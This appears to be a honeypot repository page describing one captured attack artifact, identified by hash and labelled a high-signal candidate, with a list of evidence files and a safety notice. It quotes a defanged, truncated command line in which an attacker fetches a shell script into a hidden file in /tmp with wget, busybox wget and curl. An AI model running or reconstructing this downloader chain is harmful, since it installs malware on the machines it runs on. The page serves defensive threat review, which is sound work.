# 3aefb3bdb026b7579bfd9fce499bfc9b9f8a536a7a0eea6c0838b2cfa6fe637b

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `3aefb3bdb026b7579bfd9fce499bfc9b9f8a536a7a0eea6c0838b2cfa6fe637b` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
{"topicId":"cd /tmp;rm -f .s;wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O .s;busybox wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O .s;curl
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
